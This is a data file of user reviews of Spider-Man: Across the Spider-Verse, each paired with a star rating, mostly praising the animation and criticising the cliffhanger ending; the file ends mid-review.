"LIFE CHANGING, STUNNING, SPECTACULAR, LEFT ME SPEECHLESS, MOUTH OPEN, JAW ON THE FLOOR, I LITERALLY IMPLODED AT THE END OF THE MOVIE",5
I love this movie. The first one was amazing and they managed to continue it without making it boring or to fast. I 100% recommend watching. This is now one of my favourite movies I've seen.,5
"Good, but way too long, especially for a 2 - part film.",3.5
Transcendent. Uber-talented animators display their skills throughout even better visuals than the first one. An absolutely brutal cliff-hanger. Tie-ins to the live action Venom-verse and the MCU. An absolutely fantastic sequel. Need the next rn. GO SEE IT ON A BIG SCREEN!!!!!,5
its a really great movie and a masterpeice,5
"no creo en la comedia. Es broma. se vuelve personal,, no puedo creer que la v√≠ sin mi Miles my Miles, si estas viendo esto: Hey Miles, tienes un momento? - your gwen pd, ""In every universe Gwen Stacy falls for Spider-Man and in every universe, it doesn't end well""",5
Is a good film especially for young kids to train their creativity imagination and braveness . It is really amazing !,5
Absolutely amazing one of the best spiderman movies ever. The animation is amazing and the soundtrack is soooo good. Miguel is a beast. And I like how they had a cliffhanger. It keeps the hype up for the next film. And the way it ended can make us have so many conspiracies.,5
"Top 3 Spider-Man movie of all time. Spider-Man: Across the Spider-Verse deals with every Spider-Man in a logical way. Miguel O'Hara's Spider-Man is a menacing and brute antagonist and is performed perfectly by Oscar Isaac, and Miles Morales is a AMAZING character. Now this is where I get into Spoiler territory. I have seen many people complain about how the movie forces democratic-ideals and leftist characters, but the only thing I saw that remotely follows what they say, is a poster in Gwen Stacy's room that says Protect Trans Kids. Which is in line with Gwen's character. Other than that, there is nothing else. The Spider-Verse is has infinite, which mean anyone can be behind the mask. Every Spider-Man new and old is represented well in this movie. Spectacular Spider-Man has only 2 lines I believe but his character is still believable. 60's Spider-Man is hilarious and goofy as usual. Peter B. Parker is funny in his role as a father, and Spider-Punk is AMAZING. Him and Miles chemistry is well represented and developed. Spider-Man: Across the Spider-Verse is an amazing Sequel and a good first part to a what will surely be an amazing 2 part series. While the Ending left many people ""angry"" it left many more happy and anxious for more.",5
i love the miles morales my favorite spider man and he black like me shoutout to more i‚Äôm so ready for spider verse,5
"Across the Spider-Verse builds on what worked in the first film. The artwork is unlike anything seen in an animated film, and the stories of each character are written magnificently.",4.5
This movie was absolutely amazing with the comic book style art and a great story line really made this movie stand out against the rest 10/10 recommend watching it,5
Es una pel√≠cula que deconstruye el concepto de spiderman y que nos muestra un verdadero multiverso,5
Spiderman Across the Spiderverse is the kind of movie that you leave the theater and can't wait for the next one to come out,5
TO BE CONTINUED??? It will probably be 2 years before another comes out and it will be long forgotten by then. Could have been just a little less action and finish the story. Does he save his dad or not?,0.5
The overwhelming complexity of the plot ruined the entertainment value.,3
I went into this film not expecting much but I left amazed at what I just saw. This was my favourite Spiderman movie and to be honest probably my favourite animated movie.The animation was spectacular and the only drawback was that it was a bit to long to get started. 10 out of 10 epicness.,5
A visual MASTERPIECE.,5
Sony animation is phenomenal and the story and art of this film are truly top notch.,5
Amazing full of hidden things and Easter eggs can't wait for beyond the spider verse,5
"For all the hoopla about it, the cost to get in to see it and it being the second one done how much more story can you wring out of it enough to warrant another. TO BE CONTINUED????? seriously??? Terribly disappointed. Lots of frustrated comments from others in the audience at the end when to be continued scrolled across, and the credits started to run",0.5
just go see it you will find out the greatness,4.5
I went into the theater expecting nothing much but I was BLOWN AWAY the art style still amazing and the story was amazing THIS MOVIE IS A CANNON EVENT,5
"Possibly the best animated, most visually appealing movie I'll see in my life time, unnecessarily abrupt and drawn out ending",5
Absolutely amazing. Except for the cliffhanger ending.,5
"Spiderverse delivers AGAIN. Had no idea it wouldn't have a resolution of some kind and was basically a part one if two, so that was a bit jarring. Go in with the intention to enjoy, versus get an ending with a little bow. Phenomenal cinematic experience.",4.5
The best animated movie I've ever seen. Characters built from the ground up that you actually care and invest in. It's a visual masterpiece but the heart in the movie is the real winner.,5
"Solid movie, definitely worth a watch.",4
O filme √© muito bom. Ele consegue superar o seu antecessor e a sua hist√≥ria prende as pessoas e o final te faz ficar ansioso para o pr√≥ximo filme.,5
"Three words: EPIC. FREAKIN. MOVIE. Overall, this movie gets an 11/10 from me. Recommended without reservation. Stop waiting around and go see this movie while its still in theaters.",5
"These are just the best Spider-Man movies. They have heart and style. I came out wanting the next one, now. If you liked the first Myles Morales, you'll love this one, too.",5
I thought it was amazing hada good cliffhanger!,5
Filme perfeito em todos os aspectos,5
Cliffhangerüò°üò°üò°ü§¨ü§¨ü§¨ü§¨ü§¨ü§¨ü§¨ü§¨ü§¨ü§¨ü§¨ü§¨ü§¨ü§¨ü§¨ü§¨ü§¨ü§¨ü§¨ü§¨ü§¨,3.5
Oh my god this movie was amazing!! I was so hyped to see it and now I'm even more hyped to see the Beyond the Spider-Verse next year! Cannot recommend enough!!!!!!!,5
"It was good, I enjoyed the first one more than this one. The younger kids in the theatre were bored halfway through the movie and started getting restless, it was distracting for people trying to enjoy the movie. So I don't think this is for all ages but enjoyable for older kids. You need to see the first movie before watching this one.",3.5
"This is the perfect movie. This is the best movie of all time. I can't believe how amazing the first spiderverse was but this, this movie clearly surpasses it. Every thing from the incredible, unique animation with the color changing for different moods, to then the incredible action and intense story, the interesting villain who seeks revenge. This movie even has a phenomenal story. They correctly implement jokes that are so funny but don't kill the tone like Thor love and thunder. But the best part is the relationships. This movie is one of the most remarkable when it comes to relationships. I won't spoil, but the relationships between Gwen and miles , Gwen and her father and miles and his friends.",5
"While I definitely think the Spiderverse movies are some of the best superhero films in the last decade, with amazing art and soundtracks, I just thought this one was a little too long. It just kept introducing new twists, and I was ready for it to end half an hour before it actually did. I DID enjoy it, but if I rewatch it, it won't be for the story.",4
This is an absolutely must see! Really good and super funny!,5
Liked the first one way better than this one. Way too long and two parts..,3
"The first half of the movie is great, but kinda slow. I'm sure that was the director's intention - so we would not see the ACTUAL plot coming. And what a plot twist. Beautiful animation and the start of what it seems to be wonderful character development. Also, very fun and I love how they portrayed Gen-Z's sense of humor and slangs. Miles Morales is, without a doubt, the best Spiderman.",4.5
awsome movie love dit,4.5
I was expecting better,2
Movie audio went out for a while. Not fun,5
Great movie however I prefer the first one.,4
"I absolutely loved this movie, the animation, plot, and music was phenomenal. I left the theater with chills and wanting more! I cannot stop thinking about this amazing movie!",5
"Best movie ever, except for maybe the next one! Can't wait!",5
Effortlessly recaptured the magic of the first film and takes us on a whole new emotional level that left me in awe and anxiously anticipating beyond the spider verse,4.5
"Beautiful, thematic, heart wrenching",5
"I didn't expect this movie to blow my mind, I mean I knew it would be great but THIS? Amazing",5
"gorgeous, gripping, and goes beyond expectations",4
I love this movie so much people should watch it in theaters or DVD,5
"I absolutely loved it! It had a great twist to it and perfect storyline. Of course the cliffhanger shocked me and now it sucks we have to wait anxiously for the part 2 to come out.. But I absolutely LOVED IT!! I think it was even better than the 1st one. Love it, I would recommend it to anyone! And I will definitely purchase it when possible! üíï",5
It was like watching a live comic book! Great job...,5
I love this movie it is great. It is visually appealing appeasing. I hope it wins in a Oscar,5
Already a great movie that represents different types of people and age groups. Definitely a top tier marvel movie,5
Amazing movie but way to long for a spider man movie ANIMATED i would understand for a live action movie last one was only 1h 56mins and this one 2h and 20 minutes,4.5
"Almost perfect. Only complaint: Peter should not bring a small child on Spider-Man business, and Jess Drew should not go on Spider-Woman business while carrying an even smaller child inside of her. Other than that, I have no complaints. Beautiful animation. Great story. Terrific voice acting. Hilarious comedy. Amazing characters. Truly a must-see.",4.5
"It has it all! good characterization, themes, jokes, heartbreak, action ect ect!! A must-see for fans of comic books and Spiderman especially!",5
Nothing but awe for this film! One of the most innovative and artistically stunning films ever! Can't wait for part 3!!!,5
"Visually stunning, enjoyable action, and surprisingly heartfelt family dynamics. The ""to be continued..."" was not placed in the most favorable positions, but I won't judge until seeing the sequel. Awesome film!",4.5
best spiderman movie,5
The movie was good. Just needed at a really intense part for kids. Having some sort of closure while not being finished would hand been better since it is a kids movie.,3.5
"great movie to view , we love it",5
"I watched it 4 times in theatres - would watch it again! The animation is amazing, every frame could be a poster. The soundtrack is a masterpiecie. I got goosebumps every time I hear ""Am I dreaming""",5
"It wasn't bad, but if the style of ‚Äòinto the spider-verse' wasn't exactly your thing, you may want to skip this one. The animation style in this sequel gets even more intense and jumpy. Definitely overstimulating for myself. Still, I love Spider-Man movies and the story was certainly entertaining, even if long and hard to keep up with. Definitely planning to see the next movie! Just use caution if you're not used to seeing a lot of artistic styles splattered on the screen at once‚Ä¶you may find it overwhelming.",3
So great neighbors the music really brings into it and draws you on. The actors are amazing and animations. The animations are like the best part of the character development is really good especially Graeme Stacy in miles Moralez and it's all about being your own person in the world in finding your way.,5
visually artistic. teenage/ young adult centric. every version of a person bitten by a radioactive spider you can anticipate all included.,2.5
decent action but the plot was too confusing and all over the place and it didn't give returning characters justice like penny parker and spider noir,2.5
"The animation was fantastic! The colors and the diversity of each spider man was amazing as well! There was much more representation in this movie than the last one and the real life parallels for certain characters like Gwen were amazing! I think the cliffhanger at the end sucked, but I can't wait for the next movie! If you can should go see it in theaters!",5
Best movie ive ever seen,5
"This is basically No Way Home but times 1,000, and I liked it better than the first one. The writing/storytelling and animation in this is next-level creative, huge shoutout to the people who made this movie. It's almost like they broke a 4th wall without breaking a 4th wall with describing the Spider-Man character to its core and what arcs are supposed to be for them to exist as they are as heroes. Gwen Stacey's story was good at making me care about the movie too, as well as the relationship between Miles and his parents. The dilemma they introduced about destiny vs love and saving one person vs saving everybody and Miles being motivated to do both IS who Spider-Man is, all the way back to Spider-Man in 2002. Spot was an awesome and powerful/threatening villain as well as Miguel/Spider-Man 2099 in a way too! Plus there is a well-constructed cliff hanger that makes me excited for the next movie coming out in 2024! There is only one flaw though. Miles shouldn't have known how to operate the dimension-traveling machine in the spider world when he went into that control chamber. He went around the room all invisible and moving so fast like he knew what he was doing when there should've been more hesitation and tension with that since he had never used technology like that before. That's a nitpick though. Aside from John Wick Chapter 4 this is the best movie of the year for me so far!",4.5
"Great movie, but the video where boggo unfriends boe because she had glasses is better",5
this movie is perfect. stop looking at reviews and watch it,5
This movie made me bust fat nuts due to Miguel O'hara and Hobie Brown's screen time therefore I give it a perfect 10,5
"The movie is spectacular for 2 main reasons. 1st the plot is so well done and while complicated it contains so many good storylines that make this movie great! And secondly is how this movie looks visually, it's an absolute work of art! But overall this movies slaps so HARD it slaps your brain out of your head. A+++++++",5
"My family loved it, from my nine-year-old son, our 17-year-old son, my not-fan-of-comic-book-movies husband, and myself. It was a fun, entertaining, engaging, incredible story that set the bar unbelievably high for part 2 movies forever after.",5
Great - except the cliffhanger ending!!,5
Hands down the movie of the year,5
Very good movie it's one of my top 3 favorite movies it was surprising In the movie but I gave it a 10/10,5

Bursting with vibrant animation, a captivating narrative, and an inspired multiverse concept, this sequel proves to be a thrilling ride for both die-hard Spider-Man fans and casual moviegoers alike. The movie picks up where the first installment left off, with Miles Morales continuing to explore his newfound abilities as Spider-Man. The character development is a standout feature here, allowing the audience to empathize with Miles as he grapples with the responsibilities of being a hero while balancing his personal life. The emotional depth of the story adds weight to the action-packed sequences, making them all the more impactful. Across the Spider-Verse introduces us to a host of new characters from different dimensions, each bringing their unique flair to the Spider-Man universe. The interactions between various Spider-People are both hilarious and heartwarming, forging unexpected bonds between the heroes and creating memorable moments that will leave a lasting impression.

The music adds another layer of excitement, effectively capturing the spirit of the Spider-Man universe and amplifying the emotions of pivotal scenes. While Spider-Man: Across the Spider-Verse earns high praise, it does have minor imperfections that prevent a perfect score.

Different type of movie the art,5
This movie was incredible from start to finish. What an experience man... I'm so excited for part 2!! This is a must see and it's probably the best ever made animated movie,5
"It was one of the best animated movie of all time, and a great follow up of into the spiderverse",5
Nothing happened... If you like the story just wait for the next one and rewatch the first. Very disappointing.,2
"They definitely weren't kidding with the ""part 1"" watch this boring movie if you want to see 2 1/2 hours worth of set up for 0 pay off all just eye candy pretty stupid schlock",0.5
Great movies and will definitely recommend to others!,5
This film is excellent. Spectacular even.,5
This is a masterpiece. Just watch it,5
"What is being done here with this story telling is phenomenal work , They've created a ever growing universe so flawlessly and at this point is unmatched and by no surprise because DC has been doing it for years it being animated should turn no one away . Its overflowing with onscreen characters (Spider-People) and villains . Weather you knew about SPOT and his story as a villain and intertwined him and Miles give Spidey and Goblin vibes throughout he is and will become ONE of Miles greatest challenge yet I can not wait till the third instalment , but believe me when i say they can take there sweet time I'm fully confident that it wont be released until its nothing short of perfection as mention by the cast &crew",5
THIS MOVIE WAS AWESOME WAY BETTER THAN THE FIRST ONE IT HAS SO MUCH FIGHTING SCENES SO MUCH ACTION SUPER EASY TO UNDERSTAND and the first one was just funny and had a little fighting which I liked BUT WHEN SPIDERMAN ACROSS THE VERSE CAME OUT IT BLEW MY MIND WORTH THE MONEY WORTH THE HYPE AND WAIT SO GOOD AND ENTERTAINING UNBORING.,5
Thought it stood on is own quite well,5
greatest movie of all time.,5
"I didn't see the first one, but you know what I still enjoyed this film! Oh that cliffhanger got me though! I would have liked a 4 hour long movie to see it all together looking forward to the next one and the kiddos can't wait either!",5
Absolutely amazing animation and story.,5
No words.. Perfect movie!,5
"Very confusing, but great nonetheless!",5
"Phenomenal movie, brilliantly made",5
Miles is a simp. Pavitr and hobie are best side characters.,5
Best superhero movie ever best 2023 animated movie ever,5
"I discovered I've seen one too many super hero multiverse movies. Thoroughly enjoyed Into The Spiderverse, but found this second outing over packed, over complicated and trying too hard to cover everything. Won't be going back for part 2.",3
Excellent. Deeper than the first.,5
Mastapeece. Although I'm a little salty about the cliffhanger ending.,5
Amazing If I could I would give it a googol stars Spectacular Undescribable of how good it is,5
Simplesmente um filme,5
"Can't wait for part 2, brilliant sequel to an already 5 star first film for miles. Didn't really put a step wrong for me",5
literally masterpiece.,5
ABSOLUTELY THE BEST LIKE IT WAS BETTER THAN ALL THE OTHER SPIDER-MAN MOVIES DEFINITELY SIT BACK AND ENJOY THE SPIDER EXPERIENCE,5
Liked the it alot but I felt the previous movie was better. Animation was amazing,4
"The animation, flow of everything, and action were all fantastic!",5
"‚ÄúSpider Man: Across the Spider-verse‚Äù has beautiful storytelling, and made with stunning art designs, needs a real ending",4
"Okay dont get me wrong, the animation was great and i just LOVE that all the characters have different animation styles and redesigns from the actual comic, but dont you think the movie has too much going on? like- theres too much, that we cant really focus on anything in the movie. Again, the movie is great, but i hope Beyond The Spiderverse will be better :D",3.5
"Perfection, the art style is one of the most beautiful things I ever saw, the story is great, just go watch it",5
"Awesome, absolute must-see for Spider-Man fans. so many canons",4.5
One of the best movies I've seen this year.,5
"Oh my god where do I start. I want to keep this short so Overall Great plot,animation,soundtrack, and score!!!!!!!!!!!",5
Oh my god this is the best movie of the year it was a great time and felt way too short everyone needs to see this masterpiece get this movie an oscar,5
The movie was really good but i didn't like how it ended in a cliffhanger,5
ES todo lo que pod√≠as esperar y mas eleva la precuela a mil mejor animaci√≥n mejor trama a algunas personas no les gusto por el simple echo que es animada pero ojala valoraran la pel√≠cula cuando sales del cine dices a esta pel√≠cula le falto algo pero es normal porque se divide en dos partes estoy muy emocionado a que salga la ultima porque estas dos que tenemos han sido lo mejor a lo que animaci√≥n se refiere,5
Theirs nothing to not like about this movie. Everything is amazing all the characters themes had me rocking in my seat. Character designs and animations had my eyes glued to the screen. At the end I felt like it was 30 minutes long. Genuinely an amazing film.,5
Cool Movie but it didn't continue it was getting really good,4.5
Best movie ever the action never stopped great movie definitely recommend,5
"So this movie changed my life. Like I'm saying the people who say animation sucks are wrong 100%.Like I mean where can I start? The visuals, The acting, The characters. They are all amazing the ending was awesome too. If anyone says anything bad about this movie I can prove them wrong",5
Great movie. My family really enjoy it. Much better than the first one and can‚Äôt wait to see part 3. My wife who doesn‚Äôt like this type of movies really enjoy this one.,4.5
"Amazing artistic vision translating different forms of comics into a seamless, theatrical experience, an amazing soundtrack, and a great inspiring and empowering story with more to come!",4.5
One of the worst movies I've ever seen.,0.5
Great representation and lots of fun loveable characters with a serious story to keep it grounded,5
"Wow just wow and wow again, I‚Äôll wait for the last chapter in this goated trilogy",5
Movie of the year so far,5
One of the best movies I have ever watched even saw it twice I have never done that before,5
"Spider-Man Across The Spider-Verse is as great as the first one. It has an awesome plot and I loved the incredible animation technics behind this masterpiece, soundtrack is fire and it is great how Miles and Gwen were well-written. Can't wait for the next one!",5
"This movie is good, but not nearly as good as it's being praised for being. I'm thankful I was warned that it was a two parter, but the movie is long and kept going, just to leave you on a cliff hanger. The only movie I feel has earned the right to do this is Infinity Wars. I will also accept The Empire Strikes Back. It also does the fake woke thing where they insert messages in the film because they're so brave, but they sneak them in so that you only really see them when you're looking for them, meaning they're really not being brave.",2.5
"Overrated. I don't understand all the love this movie gets, the first one was pretty good, but this one is bad. 4/10",1.5
A visual masterpiece with one of the best soundtracks and dialogue i have ever seen.,5
It's just perfect in every way,5
PHENOMENAL FILM!! probably my new favourite ever. Its beautiful.,5
"La pel√≠cula es grandiosas. Los personajes, la animaci√≥n es espectacular. Verdaderamente maravillosa . Ya espero con ansias la tercera parte 10/10",5
Amazing animation and really good film overall. Huge annoying cliffhanger,4.5
"""Spider-Man: Across the Spider-Verse is a stunning animated film with a unique art style, captivating story, and thrilling action scenes. A must-watch for fans and animation enthusiasts alike!""",5
Simply the best!!!!!,5
"I watched Spider-Man Across the Spider-Verse and this is my review of the film: The Film had all the elements of Romance, Action, Thrill, Suspense, and great dialogues. The Film is truly an excellent film, as everything has been done in an Positive manner. I will give a 5/5 star rating for the film and I loved the film.",5
"From the animation to the soundtrack, spectacular work. The movie is a must see for fans of Spiderman. For those that are interested in just seeing a movie, there is a great buildup in the plot and character development from the previous movie along with some comedic sprinkle. The visuals of the movie are amazing!",5
This is honestly the best superhero movie I've ever seen. If you want a good time watching a touching and fun story then this is the movie for you.,5
It's was all good. Had little bit of everything like actions emotion and introduced many other characters. Amazing movie but only one problem. It was a long moving and it made me bored sometimes And was kinda getting tired with Gwen and her relationship with her dad but I'm kinda fine with it for the positive made up for it,4.5
"It's like the epitome of the art of animation. Beautiful characters, beautiful effects and a beautiful depiction of Spiderman. Must watch!",5
i love it and the characters are amazing but i liked the 1st one much more,4
"This movie is simply fantastic. Every scene was put together in a masterful way and it blended its story and animation into a true experience. It's a little overstuffed and it ends on a cliffhanger, but it's still fantastic. It's hard to describe this movie in words, but it definitely is a masterpiece and worth watching. Watch this movie! 9.5/10",5
"The movie was very trippy, with the glitching inherent to the medium. I loved the interwoven, complex storylines and was excited about Donald Glover‚Äôs cameos. It‚Äôs fun to try to place all the characters‚Äô live actor voices.",5
might just be the best fucking spider man movie.,5
"The sequel has the same level of emotion and bright as the first movie, and this and the first movies are my favorite super heroes movies ever. I can't wait for the third movie to release, and it will be the best trilogy ever. I hope the sequel doesn't get delayed.",5
"Visually stunning but utterly trivial and contrived. A jumble of ludicrous, thinly felt plot twists and turns that add up to nothing. When AI start making films THIS is what they will make. A dazzling neon experience which will make you feel nothing except the wish that you were watching something of substance.",2
this is the movie debut of spider cat,5
The animation and visuals are incredible and the movie moves at an electric pace. Story didn‚Äôt quite grip me as much as the first film. Fun cliffhanger ending leaves me excited for the next one.,4
"The art and voice acting was superb! However, I felt the length was too long. The story kept extending when it really didn't need it. Overall, a decent watch.",3
"Stunning visuals, just wow. Best superhero movie, and fantastically funny. 10/10!",5
"Saw this film twice in cinemas. Absolutely breathtaking animation, great writing, intriguing characters. The only thing that puts this film down is its abrupt ending as it part 1 in a 2-parter. But never the less the film was great maybe even better than the first.",4.5
"Arguably the best animated movie ever made. The story, characters, antagonists, music, and animation/art was spectacular. I did not get bored for even a moment, none of the scenes felt wasted or lackluster at all. The soundtrack is just phenomenal and really helped to amplify many of the scenes. The humor was actually good. Everything about Across The Spiderverse was brilliant. This is a must must see for anyone.",5
This amazing the spot is awesome my favourite character is Indian spider man he has this amazing toy thing that he throws at enemies and I like how mubattem is india and New York City together,5
Good movie. Look forward to seeing what happens in the second part. Loved the ending,4
Possibly even better than the first. Only flaw was the ending.,4.5
Clearly one of the best animation flicks of the year. The comic motif throughout the film is just outstanding.,5
the style of the movie is very suitably for meÔºåI‚Äòd like it vary muchüòã,4
"On a technical level, possibly the best animated movie ever made. Regarding the plot and characters, the movie manages to be as good (and at moments better) than the first film. Even though the movie ends on a cliffhanger, it delivers a story of it¬¥s own, that it¬¥s easier to divide in two acts rather than the usual three. The meta-narrative introduced as a story-telling device helps the film differentiate itself from other recent multi-verse movies, which the first movie made possible. In general, a fun and emotional movie-going experience for both old and young viewers.",5
The only thing negative was that part 2 doesnt come out into March 2024!,5
The movie was an amazing visual web of scenes that swing smoothly one after another!! The web is yet to be completed but I look forward to seeing it finished,4.5
"This movie is a well made movie with fantastic visuals and a great story, what really stands out is that the characters have a compelling narrative for being spider man especially between Miles Morales and Gwen Stacy, 2099 spider man and spot is a perfect example on how to have two villains in a movie without being a mess (Spider Man 3, The amazing spider man 2) the only problem I have with the movie is the cliffhanger because, SPOILERS, at the end we see the prowler, Miles Morales uncle being captured in another universe where his dad is already dead and we see another miles but as the prowler and the only issue I have is that I‚Äôm not one scene we don‚Äôt see him acting or some sign of him being like his uncle which in my opinion would be stronger and more effective for the movie but overall 9.5/10",4.5
another amazing spider man movie. can't wait for the next one.,4
"Absolute cinema, they simply invented cinema 2.",5
Miles Morales steals your heart again great movies with great emotions,5
"This is by far the best Spiderman to ever be created, it's a love letter to marvel fans. The hype is real with this movie, it's beautifully written, directed and animated. Had the whole theater cracking up when watching this.",5
"I've yet to see a single animated movie or show with as much care, time, and polish put into it as this movie. Characters, old and new, are handled with immense amounts of love (unless you're a Ben Reilly fan), and they feel like real people. It's incredible. I came into this movie knowing it was a part 1, so the cliffhanger ending was hardly a surprise for me, even if others are enraged by it. I feel it was a great stopping point (minor spoilers ahead) as it rounded out Gwen's character arc. Beyond all of this, the movie felt like it was made for Gen Z, and I'm all here for it. One of, if not the best animated media I've ever seen and experienced. I've seen it 5 times in theatres by now.",5
I fell asleep twice but my 4 and 6 year old liked it.,2
What movie was that?! Negative point was there was no warning that it would not have an end.,3.5
"Es Cine brother, totalmente espectacular",5
"After the huge success of the first Spiderverse movie, I wondered how a second movie would stack up. Rest assured, this was like my morning Rice Crispies... it still brought that Snap, Crackle and Pop! Great visuals with a tight and entertaining storyline that was able to nail the paradox of the human condition and our often complex relationships with those nearest and dearest to us.",4.5
"The best Spider-man movie ever. I absolutely love the characters' insight and development in this movie, which makes it stand out from other superhero films",5
"Une animation au top, vraiment bluffant, nous avons pass√© un agr√©able moment devant ce film ! :)",4.5
"Easily in my top 5 favorite comic book movies of all time! Actual effort put into this movie. Wonderful action, hilarious comedy, amazing characters, chilling score, fantastic story and has the best cliffhanger since Infinity War. I need Beyond the Spider-verse NOW!!!!!!!!!! 10/10!!",5
This movie was great and awesomeüëç,5
Im very late to reviewing this but I have been a Spider- Man nerd since I was a little boy(I'm 23 now). This movie was like the best possible fever dream you could have! Miles really brings his own to the character and really proves to anyone that he can be up there with the big dogs! Besides that you have your normal suspects the cast killed it and the animation was perfection!,5
"I love this film from start to finish. It's amazing how they managed to incorporate the long history of Spider-Man with some incredible new characters and some live-action. Artistically, they are setting a standard in animation and music, and how color is incorporated to signify emotions and actions. This was quite possibly one of the best‚Ä¶.. To be continued‚Ä¶",5

"Incredibly fun! It starts off slow with lots of character and world building, but once it starts picking up speed it keeps going and doesn't stop and it's a great ride. Excited for what comes next!",5
Way crazier than the first one. Great movie.,5
"They should have kept the old spider man characters, they have destroyed this movie... keep the old classics with original characters... wont be watching spiderman ever again because of this one...",0.5
Great movie!!!! My childhood ü´Ç,5
"Very good, liked all the Easter eggs in the movie.",5
"In the beginning part is quite boring, didn't expect is cartoon. But till the behind part, it reverses, its splendid. Its not bad will go for a second time.",5
"Very grateful to this movie, that is awesome!",5
The movie was really good!! (Even th hot he staff was not so nice) we still enjoyed the movie and the seats were very comfortable and prices were better then most other theaters.,4
"just see it, I can't describe how awesome this movie is, it's an in person experience type of watch. 11/10",5
It's the best Spiderman movie EVER MADE. Bar None. Hands down. I've seen them all - multiple times. No question - Across the SpiderVerse is the best.,5
Not just one of the best animated films but one of the best films in general this is a movie that academy should give it more Oscar nominations including Best picture and should win Best picture the best animated movie ever a masterpiece.,5
"Loved it!!! My only complaint is it ends on a cliffhanger. I don't want to wait years to see the ending, if we even get one because of the strikes going on. üò≠",5
"Liked the music, animation, cinematography, humor, relatableness, family-friendliness, action, plot twists... Basically whole movie, disliked the cliff hanger and that the second part won't be out for another could years",5
Phenomenal visual direction and storytelling. Just plain fun.,5
"Muy sobrevalorada la pel√≠cula, literal solo por qu√© trata de spiderman la gente la sobrevalora demasiado, lo √∫nico bueno es la animaci√≥n, pero deja que desear en la historia, el concepto de eventos canon es fatal",0.5
Amazing movie slightly better than original great engaging plot beautiful animation and a heartfelt story,5
"Amazing movie! Best Spider-Man movie of all time imo! Miles is that dude!!! Potential movie of the year, Can't recommend this movie enough! Can't wait for part 3",5
I could watch this over and over again! BEST NEW SPIDERMAN EVER!!!!!!!!!!!!!!,5
"I am convinced that we are facing one of the greatest eminences not only of Marvel, but also of the world of cinema in general. The visual work that this film performs is something that, I hope, prospers for a long, long time. Although I do not consider that the story and narrative of the film can be interesting for everyone, it must be recognized that it is something that has never been seen before. I look forward to ""Spiderman: Beyond the Spiderverse"". This movie is an experience that I believe everyone must experience. There are no words that describe it perfectly. Just a gem.",5
Must see! Great movie,5
yeah that's pretty good,5
It was a acomplex web of thrill and suspense!!,5
I didn't think they could top into the spiderverse but damn did they.,5
"The ending was not good. However, I did like how diverse it was.",0.5
very good movie Spiderman so handsome i like this movie so much,5
"The animation was groundbreaking! The story was really good. The old characters were fun and interesting, but the new characters were also pretty good.",4
One of the best movies I've ever seen . I was honestly overwhelmed by how good it was . Had to see it twice in Theaters twice . Post credit scene was very poetic and the foreshadowing of the main villain was done perfectly.,5
I like it because of the animation and the story.,5
The movie was everything I wished for and more! I loved it so much I reccomend it highly. My new favorite movie.,5
"Nice movie,highly recommended!",5
I liked it being an animation. my daughter really enjoyed. looking forward to the next movie!!!,4
"MARAVILHOSO, INCR√çVEL,LINDO LINDO LINDO LINDO LINDO!!!!!! ESSE FILME √â PFT PARA TODOS OS F√ÉS DO HOMEM ARANHA,TEVE REFERICIA DE MEMES ANTIGOS E GUARDINHOS QUE DEU UMA NOSTALGIA MUITO FODA,A HIST√ìRIA VC SE FIXS E QUER SABER MAIS E VARIAS OUTRAS COISAS FEZ ESSE FILME SER PFT",5
Absolutely great movie!! Beautiful artwork!!,5
"Absolutely love the movie. It was beautiful one of the most visually pleasing movies I have ever seen it was like an interactive art painting, highly recommend it to anyone looking for a good movie to watch great for family, or for individual enjoyment as well. Very funny and great story can't wait for the next movie.",5
It was a pretty good plot and I thought that the theme that would follow o hara every other time he appeared on screen was cool as hell. The only thing I didn‚Äôt like was that it ended on a cliffhanger but I guess it‚Äôs whatever. Overall great movie though :p,4.5
"Just garbage. We had to leave after 15 mins. Not understand how the critics give it such a high score. Or, better, I under$tand",0.5
OMG! you have to watch it its amazing changed my life,5
It was an excellent movie with great animation! It was a total blast!,5
"Spider-Man Across the Spider-Verse manages to surpass its predecessor in every possible way. The animation seems more polished compared to the first film, with the use of a few new animation styles and a vibrant color palette. The voice acting continues to impress, with Shameik Moore and Hallie Steinfeld both delivering great performances as Miles Morales and Gwen Stacy, just as they did in the in the first film. Oscar Isaac's inclusion as Spider-Man 2099 is also a great addition to the cast. In terms of storytelling, the film shifts the focus to Miles Morales, transforming it into a deeply personal journey. His character receives a lot of depth and development, allowing audiences to make a stronger connection with him. Through the story we also get an intriguing backstory that ties everything together seamlessly. This really feels like a Miles Morales story, whereas the first film felt like a Spider-Man story.Additionally, the Spider-Verse plays an important role, introducing several unique Spider-variants, many of which I've never heard of before, but there use continues to prove that Sony animation handles the concept of multiverses better than the MCU has thus far. Overall, Across the Spider-Verse excels in every aspect. The animation, soundtrack, acting, and storyline all surpass the first film's. It stands as one of the most captivating cinematic experiences of the year, and makes me more excited for the second part.",5
"Great sequel. Full of emotion and leaves you on the edge of your seat. You'll leave wanting more, and that's how it should be.",5
"As a comic book nerd, this was probably the most excited I've been in a movie theater since Endgame. It's infuriating when you realize that this cost less than half as much to make as Black Adam or Ant-Man and the Wasp: Quantumania.",5
"Not as good as the first one in my opinion, but still a great story and character's to invest in. Maybe slightly too long, but its worth it.",4
"The best spiderman movie ever created tbh, also might be the best marvel movie",5
This is hands down my favorite Spider-Man move. I always question how can they do better better than the first and they prove me wrong everytime!!,5
Can't wait for part 2 didn't disappoint,5
"Brave, innovative. Best movie I seen in a theatre. As good As Lotr : Fellowship of The Ring",5
"Just for a tv , no for a cinema",1.5
i loved everything about it.,4.5
"Great story, love the character development. They keep us wanting more Spider-Man movies",5
"Great story, love the character development. They keep us wanting more Spider-Man movies!",5
"this is not anywhere near as good as it's being rated. the first film already had far too many characters with far too little screen time, but this one doubles, triples, and quadruples down on it. this isn't a movie, it's a series of cameos from a never ending number of throwaway characters. the film can't even figure out what it's own plot is because it's far too heavily invested in this stupidly trite multiverse nonsense. i didn't mind when the first 20 films did it, but do we need another one, especially if it brings nothing new to the table other than visual aesthetic? the movie simply has nothing to say, and is probably much better as a graphic novel where we can revel in the animator's skill, and tolerate the fact that it's just a book full of character concepts that weren't good enough for their own feature. instead, it's just bloated, unfocused, and it's impossible to care about any of the cast when there are so many of them with such annoying personalities. the worst part about all of this? just when you thought something, ANYTHING was going to happen, the movie just ends. it's literally about nothing. they are just stalling so they can make a trilogy out of a single story that shouldn't have been so packed with hamfisted crap in the first place. the first one was good, but would easily have been better with a smaller cast and a less superfluous script. the film can't slow down for 30 seconds to have a serious, plot relevant conversation or to build any attachment to the characters, and so there's just no weight to any of it. we can't be invested in a film that openly portrays itself as randomized nonsense, at least not without a firmer narrative backbone or some kind of defining feature to set 